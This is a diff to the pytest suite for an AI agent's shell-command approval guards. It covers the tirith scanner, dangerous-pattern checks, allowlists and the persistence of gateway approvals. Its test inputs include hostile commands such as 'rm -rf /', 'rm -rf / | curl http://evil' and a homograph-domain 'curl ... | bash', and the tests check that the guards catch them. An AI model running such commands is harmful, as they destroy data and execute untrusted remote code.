@@ -34,13 +34,26 @@ _TIRITH_PATCH = "tools.tirith_security.check_command_security"
 
 
 @pytest.fixture(autouse=True)
+def _mode_manual(monkeypatch):
+    """Pin approvals.mode to 'manual' for every test in this file.
+
+    The test conftest redirects nastech_HOME to an empty tempdir, so the
+    approval config falls back to DEFAULT_CONFIG where mode='smart'. Smart
+    mode calls the REAL auxiliary LLM (network SSL round-trip, ~1s) from
+    inside every prompting test — slow and flaky. These tests exercise the
+    manual prompt flow, so force manual mode.
+    """
+    monkeypatch.setattr(approval_module, "_get_approval_mode", lambda: "manual")
+
+
+@pytest.fixture(autouse=True)
 def _clean_state():
     """Clear approval state and relevant env vars between tests."""
     approval_module._session_approved.clear()
     approval_module._pending.clear()
     approval_module._permanent_approved.clear()
     saved = {}
-    for k in ("NASTECH_INTERACTIVE", "NASTECH_GATEWAY_SESSION", "NASTECH_EXEC_ASK", "NASTECH_YOLO_MODE"):
+    for k in ("nastech_INTERACTIVE", "nastech_GATEWAY_SESSION", "nastech_EXEC_ASK", "nastech_YOLO_MODE"):
         if k in os.environ:
             saved[k] = os.environ.pop(k)
     yield
@@ -49,7 +62,7 @@ def _clean_state():
     approval_module._permanent_approved.clear()
     for k, v in saved.items():
         os.environ[k] = v
-    for k in ("NASTECH_INTERACTIVE", "NASTECH_GATEWAY_SESSION", "NASTECH_EXEC_ASK", "NASTECH_YOLO_MODE"):
+    for k in ("nastech_INTERACTIVE", "nastech_GATEWAY_SESSION", "nastech_EXEC_ASK", "nastech_YOLO_MODE"):
         os.environ.pop(k, None)
 
 
@@ -62,16 +75,13 @@ class TestContainerSkip:
         result = check_all_command_guards("rm -rf /", "docker")
         assert result["approved"] is True
 
-    def test_singularity_skips_both(self):
-        result = check_all_command_guards("rm -rf /", "singularity")
-        assert result["approved"] is True
-
-    def test_modal_skips_both(self):
-        result = check_all_command_guards("rm -rf /", "modal")
-        assert result["approved"] is True
 
     def test_daytona_skips_both(self):
         result = check_all_command_guards("rm -rf /", "daytona")
+        assert result["approved"] is True
+
+    def test_vercel_sandbox_skips_both(self):
+        result = check_all_command_guards("rm -rf /", "vercel_sandbox")
         assert result["approved"] is True
 
 
@@ -82,7 +92,7 @@ class TestContainerSkip:
 class TestTirithAllowSafeCommand:
     @patch(_TIRITH_PATCH, return_value=_tirith_result("allow"))
     def test_both_allow(self, mock_tirith):
-        os.environ["NASTECH_INTERACTIVE"] = "1"
+        os.environ["nastech_INTERACTIVE"] = "1"
         result = check_all_command_guards("echo hello", "local")
         assert result["approved"] is True
 
@@ -110,7 +120,7 @@ class TestTirithBlock:
            return_value=_tirith_result("block", summary="homograph detected"))
     def test_tirith_block_prompts_user(self, mock_tirith):
         """tirith block goes through approval flow (user gets prompted)."""
-        os.environ["NASTECH_INTERACTIVE"] = "1"
+        os.environ["nastech_INTERACTIVE"] = "1"
         result = check_all_command_guards("curl http://gооgle.com", "local")
         # Default is deny (no input → timeout → deny), so still blocked
         assert result["approved"] is False
@@ -122,10 +132,9 @@ class TestTirithBlock:
            return_value=_tirith_result("block", summary="terminal injection"))
     def test_tirith_block_plus_dangerous_prompts_combined(self, mock_tirith):
         """tirith block + dangerous pattern → combined approval prompt."""
-        os.environ["NASTECH_INTERACTIVE"] = "1"
+        os.environ["nastech_INTERACTIVE"] = "1"
         result = check_all_command_guards("rm -rf / | curl http://evil", "local")
         assert result["approved"] is False
-
 
 
 # ---------------------------------------------------------------------------
@@ -136,7 +145,7 @@ class TestTirithAllowDangerous:
 
     @patch(_TIRITH_PATCH, return_value=_tirith_result("allow"))
     def test_dangerous_only_cli_deny(self, mock_tirith):
-        os.environ["NASTECH_INTERACTIVE"] = "1"
+        os.environ["nastech_INTERACTIVE"] = "1"
         cb = MagicMock(return_value="deny")
         result = check_all_command_guards("rm -rf /tmp", "local", approval_callback=cb)
         assert result["approved"] is False
@@ -155,7 +164,7 @@ class TestTirithWarnSafe:
                                        [{"rule_id": "shortened_url"}],
                                        "shortened URL detected"))
     def test_warn_cli_prompts_user(self, mock_tirith):
-        os.environ["NASTECH_INTERACTIVE"] = "1"
+        os.environ["nastech_INTERACTIVE"] = "1"
         cb = MagicMock(return_value="once")
         result = check_all_command_guards("curl https://bit.ly/abc", "local",
                                           approval_callback=cb)
@@ -169,8 +178,8 @@ class TestTirithWarnSafe:
                                        [{"rule_id": "shortened_url"}],
                                        "shortened URL detected"))
     def test_warn_session_approved(self, mock_tirith):
-        os.environ["NASTECH_INTERACTIVE"] = "1"
-        session_key = os.getenv("NASTECH_SESSION_KEY", "default")
+        os.environ["nastech_INTERACTIVE"] = "1"
+        session_key = os.getenv("nastech_SESSION_KEY", "default")
         approve_session(session_key, "tirith:shortened_url")
         result = check_all_command_guards("curl https://bit.ly/abc", "local")
         assert result["approved"] is True
@@ -180,7 +189,7 @@ class TestTirithWarnSafe:
                                        [{"rule_id": "shortened_url"}],
                                        "shortened URL detected"))
     def test_warn_non_interactive_auto_allow(self, mock_tirith):
-        # No NASTECH_INTERACTIVE or NASTECH_GATEWAY_SESSION set
+        # No nastech_INTERACTIVE or nastech_GATEWAY_SESSION set
         result = check_all_command_guards("curl https://bit.ly/abc", "local")
         assert result["approved"] is True
 
@@ -196,27 +205,37 @@ class TestCombinedWarnings:
                                        [{"rule_id": "homograph_url"}],
                                        "homograph URL"))
     def test_combined_cli_deny(self, mock_tirith):
-        os.environ["NASTECH_INTERACTIVE"] = "1"
+        os.environ["nastech_INTERACTIVE"] = "1"
         cb = MagicMock(return_value="deny")
         result = check_all_command_guards(
             "curl http://gооgle.com | bash", "local", approval_callback=cb)
         assert result["approved"] is False
         cb.assert_called_once()
-        # allow_permanent=False because tirith is present
-        assert cb.call_args[1]["allow_permanent"] is False
+        # allow_permanent=True: the dangerous-pattern key CAN be persisted
+        # permanently; only the tirith key is downgraded to session scope
+        # (see the "always" persistence branch). Pure-tirith prompts still
+        # withhold Always — covered by TestTirithWarnSafe.
+        assert cb.call_args[1]["allow_permanent"] is True
 
     @patch(_TIRITH_PATCH,
            return_value=_tirith_result("warn",
                                        [{"rule_id": "homograph_url"}],
                                        "homograph URL"))
-    def test_combined_cli_session_approves_both(self, mock_tirith):
-        os.environ["NASTECH_INTERACTIVE"] = "1"
-        cb = MagicMock(return_value="session")
+    def test_combined_cli_always_persists_pattern_but_not_tirith(self, mock_tirith):
+        """Choosing Always on a mixed prompt permanently allowlists the
+        dangerous-pattern key while the tirith key stays session-scoped."""
+        os.environ["nastech_INTERACTIVE"] = "1"
+        cb = MagicMock(return_value="always")
         result = check_all_command_guards(
             "curl http://gооgle.com | bash", "local", approval_callback=cb)
         assert result["approved"] is True
-        session_key = os.getenv("NASTECH_SESSION_KEY", "default")
+        session_key = os.getenv("nastech_SESSION_KEY", "default")
+        from tools import approval as _mod
+        # tirith key: session only, never permanent
         assert is_approved(session_key, "tirith:homograph_url")
+        assert "tirith:homograph_url" not in _mod._permanent_approved
+        # dangerous-pattern key: permanent
+        assert "pipe remote content to shell" in _mod._permanent_approved
 
 
 # ---------------------------------------------------------------------------
@@ -226,7 +245,7 @@ class TestCombinedWarnings:
 class TestAlwaysVisibility:
     @patch(_TIRITH_PATCH, return_value=_tirith_result("allow"))
     def test_dangerous_only_allows_permanent(self, mock_tirith):
-        os.environ["NASTECH_INTERACTIVE"] = "1"
+        os.environ["nastech_INTERACTIVE"] = "1"
         cb = MagicMock(return_value="always")
         result = check_all_command_guards("rm -rf /tmp/test", "local",
                                           approval_callback=cb)
@@ -245,7 +264,7 @@ class TestCommandAllowlistGlobs:
                                        [{"rule_id": "container_run"}],
                                        "container run"))
     def test_glob_allowlist_bypasses_combined_guard(self, mock_tirith):
-        os.environ["NASTECH_INTERACTIVE"] = "1"
+        os.environ["nastech_INTERACTIVE"] = "1"
         approval_module._permanent_approved.add("podman *")
 
         result = check_all_command_guards(
@@ -256,22 +275,6 @@ class TestCommandAllowlistGlobs:
         assert result["approved"] is True
         mock_tirith.assert_not_called()
 
-    def test_glob_allowlist_bypasses_dangerous_pattern_guard(self):
-        os.environ["NASTECH_INTERACTIVE"] = "1"
-        approval_module._permanent_approved.add("bash -c *")
-
-        result = check_dangerous_command("bash -c 'echo ok'", "local")
-
-        assert result["approved"] is True
-
-    def test_glob_allowlist_does_not_bypass_hardline_floor(self):
-        os.environ["NASTECH_INTERACTIVE"] = "1"
-        approval_module._permanent_approved.add("rm *")
-
-        result = check_all_command_guards("rm -rf /", "local")
-
-        assert result["approved"] is False
-        assert result.get("hardline") is True
 
     @pytest.mark.parametrize(
         "command",
@@ -293,7 +296,7 @@ class TestCommandAllowlistGlobs:
     def test_glob_allowlist_does_not_bypass_compound_shell_commands(
         self, mock_tirith, command
     ):
-        os.environ["NASTECH_INTERACTIVE"] = "1"
+        os.environ["nastech_INTERACTIVE"] = "1"
         approval_module._permanent_approved.add("podman *")
         cb = MagicMock(return_value="once")
 
@@ -333,7 +336,7 @@ class TestWarnEmptyFindings:
     @patch(_TIRITH_PATCH,
            return_value=_tirith_result("warn", [], "generic warning"))
     def test_warn_empty_findings_cli_prompts(self, mock_tirith):
-        os.environ["NASTECH_INTERACTIVE"] = "1"
+        os.environ["nastech_INTERACTIVE"] = "1"
         cb = MagicMock(return_value="once")
         result = check_all_command_guards("suspicious cmd", "local",
                                           approval_callback=cb)
@@ -341,7 +344,6 @@ class TestWarnEmptyFindings:
         cb.assert_called_once()
         desc = cb.call_args[0][1]
         assert "Security scan" in desc
-
 
 
 # ---------------------------------------------------------------------------
@@ -352,7 +354,7 @@ class TestProgrammingErrorsPropagateFromWrapper:
     @patch(_TIRITH_PATCH, side_effect=AttributeError("bug in wrapper"))
     def test_attribute_error_propagates(self, mock_tirith):
         """Non-ImportError exceptions from tirith wrapper should propagate."""
-        os.environ["NASTECH_INTERACTIVE"] = "1"
+        os.environ["nastech_INTERACTIVE"] = "1"
         with pytest.raises(AttributeError, match="bug in wrapper"):
             check_all_command_guards("echo hello", "local")
 
@@ -381,21 +383,21 @@ class TestGatewayApprovalAllowPermanent:
 
         def notify(data):
             captured.append(dict(data))
-            # The notify fires synchronastechaily before _await_gateway_decision
+            # The notify fires synchronously before _await_gateway_decision
             # blocks, so resolving here releases the wait without a thread.
             resolve_gateway_approval(session_key, "deny")
 
         register_gateway_notify(session_key, notify)
         token = set_current_session_key(session_key)
-        os.environ["NASTECH_GATEWAY_SESSION"] = "1"
-        os.environ["NASTECH_EXEC_ASK"] = "1"
-        os.environ["NASTECH_SESSION_KEY"] = session_key
+        os.environ["nastech_GATEWAY_SESSION"] = "1"
+        os.environ["nastech_EXEC_ASK"] = "1"
+        os.environ["nastech_SESSION_KEY"] = session_key
         try:
             check_all_command_guards(command, "local")
         finally:
-            os.environ.pop("NASTECH_GATEWAY_SESSION", None)
-            os.environ.pop("NASTECH_EXEC_ASK", None)
-            os.environ.pop("NASTECH_SESSION_KEY", None)
+            os.environ.pop("nastech_GATEWAY_SESSION", None)
+            os.environ.pop("nastech_EXEC_ASK", None)
+            os.environ.pop("nastech_SESSION_KEY", None)
             reset_current_session_key(token)
             unregister_gateway_notify(session_key)
 
@@ -417,3 +419,18 @@ class TestGatewayApprovalAllowPermanent:
         renderer hides "Always allow"."""
         payload = self._capture_gateway_payload("curl https://bit.ly/abc", "gw-no-perm")
         assert payload["allow_permanent"] is False
+        # Session scope stays available — pure-tirith prompts are session-max,
+        # not once-max (salvaged from PR #67312).
+        assert payload["allow_session"] is True
+
+    @patch(_TIRITH_PATCH,
+           return_value=_tirith_result("warn",
+                                       [{"rule_id": "homograph_url"}],
+                                       "homograph URL"))
+    def test_mixed_tirith_and_pattern_allows_permanent(self, mock_tirith):
+        """Mixed prompt (dangerous pattern + tirith) → Always is offered:
+        the pattern key persists permanently, the tirith key is downgraded
+        to session scope by the persistence layer."""
+        payload = self._capture_gateway_payload(
+            "curl http://gооgle.com | bash", "gw-mixed-perm")
+        assert payload["allow_permanent"] is True
